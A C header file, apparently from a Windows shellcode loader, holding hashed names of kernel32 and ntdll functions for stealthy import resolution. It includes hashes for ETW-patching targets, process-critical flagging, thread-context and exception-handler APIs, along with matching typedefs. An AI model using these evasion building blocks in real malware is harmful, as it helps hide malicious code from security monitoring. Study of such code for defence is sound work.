#pragma once

#define WAITTIMER -150000000

// Module hashes need to be in UNICODE format so adjust the hashes tool
// Hashes of modules
#define KERNEL32_HASH   0xffffffff330c7795
#define NTDLL_HASH      0xffffffff7808a3d2

// Hashes of WinAPI functions
#define CREATEMUTEX_HASH        0xffffffff2d789102
#define RELEASEMUTEX_HASH       0xffffffff27ef86df
#define GETLASTERROR_HASH       0xffffffffd2e536b7
#define CLOSEHANDLE_HASH        0xffffffffb09315f4
#define TERMINTATEPROCESS_HASH  0xffffffffab40bf8d
#define FINDRESOURCEW_HASH      0xffffffffcad4de2b
#define LOADRESOURCE_HASH       0xffffffff92ffa82f
#define LOCKRESOURCE_HASH       0xffffffff49b3b7c3
#define SIZEOFRESOURCE_HASH     0xffffffffc319fa22
#define FREERESOURCE_HASH       0xffffffff033a7dbb
#define GETTICKCOUNT64_HASH     0xffffffff517fef08
#define VIRTUALPROTECT_HASH     0xffffffff10066f2f
#define RTLSECUREZEROMEMORY_HASH    0xffffffff8d3c4b0c

// Hashes of NTDLL functions
#define NTALLOCATEVIRTUALMEMORY_HASH	0xffffffffe0762feb
#define NTPROTECTVIRTUALMEMORY_HASH 	0xffffffff5c2d1a97
#define NTCREATETHREADEX_HASH   		0xffffffff2073465a
#define NTWAITFORSINGLEOBJECT_HASH  	0xffffffffdd554681
#define RTLSETPROCESSISCRITICAL_HASH    0xffffffff26f94a0b
#define NTDELAYEXECUTION_HASH           0xfffffffff5a86278
#define NTCREATEMUTANT_HASH             0xffffffffce8ff6b0
#define NTRELEASEMUTANT_HASH            0xffffffff845c7d53
#define NTOPENMUTANT_HASH               0xffffffffb34696b2
#define NTCLOSE_HASH                    0xffffffff0d09c750
#define RTLINITUNICODESTRING_HASH       0xffffffff7aa7b69b
#define NTGETCONTEXTTHREAD_HASH         0xffffffffd3534981
#define NTSETCONTEXTTHREAD_HASH         0xffffffffe1453b98
#define ETWEVENTWRITE_HASH              0xffffffff0d109b8c
#define ETWEVENTWRITEFULL_HASH          0xffffffff22f74be0
#define RTLADDVECTOREDEXCEPTIONHANDLER_HASH     0xffffffffbaab0208
#define RTLREMOVEVECTOREDEXCEPTIONHANDLER_HASH  0xfffffffffed80136


// Pseudo handles to current process & thread
#define NtCurrentProcess() ((HANDLE)-1) // Return the pseudo handle for the current process
#define NtCurrentThread()  ((HANDLE)-2) // Return the pseudo handle for the current thread

// Hashes of WinAPI Function
typedef HANDLE(WINAPI* t_CreateMutexW)(
    _In_opt_ LPSECURITY_ATTRIBUTES lpMutexAttributes,
    _In_ BOOL bInitialOwner,
    _In_opt_ LPCWSTR lpName
);

typedef BOOL(WINAPI* t_ReleaseMutex)(
    _In_ HANDLE hMutex
);

typedef _Check_return_ _Post_equals_last_error_ DWORD (WINAPI* t_GetLastError)(VOID);

typedef BOOL (WINAPI* t_CloseHandle)(_In_ _Post_ptr_invalid_ HANDLE hObject);

typedef BOOL (WINAPI* t_TerminateProcess)(
    _In_ HANDLE hProcess,
    _In_ UINT uExitCode
);

typedef HRSRC(WINAPI* t_FindResourceW)(
    _In_opt_ HMODULE hModule,
    _In_ LPCWSTR lpName,
    _In_ LPCWSTR lpType
);

typedef HGLOBAL(WINAPI* t_LoadResource)(
    _In_opt_ HMODULE hModule,
    _In_ HRSRC hResInfo
);

typedef LPVOID(WINAPI* t_LockResource)(
    _In_ HGLOBAL hResData
);

typedef DWORD(WINAPI* t_SizeofResource)(
    _In_opt_ HMODULE hModule,
    _In_ HRSRC hResInfo
);

typedef BOOL(WINAPI* t_FreeResource)(
    _In_ HGLOBAL hResData
);

typedef ULONGLONG (WINAPI* t_GetTickCount64)();

typedef PVOID (WINAPI* t_RtlSecureZeroMemory)(
    _Out_ PVOID  ptr,
    _In_  SIZE_T cnt
);

typedef BOOL(WINAPI* t_VirtualProtect)(
    _In_  LPVOID lpAddress,
    _In_  SIZE_T dwSize,
    _In_  DWORD flNewProtect,
    _Out_ PDWORD lpflOldProtect
);

// Typedefs of NTDLL functions
typedef NTSTATUS (NTAPI* t_RtlSetProcessIsCritical)(
    BOOLEAN bNew,    	// new setting for process
    BOOLEAN* pbOld,    	// pointer which receives old setting (can be null)
    BOOLEAN bNeedScb    // need system critical breaks
);    	

typedef NTSTATUS (NTAPI* t_NtDelayExecution)(
    BOOLEAN              Alertable,
    PLARGE_INTEGER       DelayInterval
);

typedef void (NTAPI* t_RtlInitUnicodeString)(
    _Out_           PUNICODE_STRING DestinationString,
    _In_opt_        PCWSTR          SourceString
);

typedef NTSTATUS (NTAPI* t_RtlInitUnicodeStringEx)(
    _Out_           PUNICODE_STRING DestinationString,
    _In_opt_        PCWSTR          SourceString
);

typedef NTSTATUS(NTAPI* t_NtCreateMutant)(
    OUT PHANDLE MutantHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN BOOLEAN InitialOwner
);

typedef PVOID (WINAPI* t_RtlAddVectoredExceptionHandler)(
    ULONG First,
    PVECTORED_EXCEPTION_HANDLER Handler
);

typedef ULONG (WINAPI* t_RtlRemoveVectoredExceptionHandler)(
    PVOID hHandler
);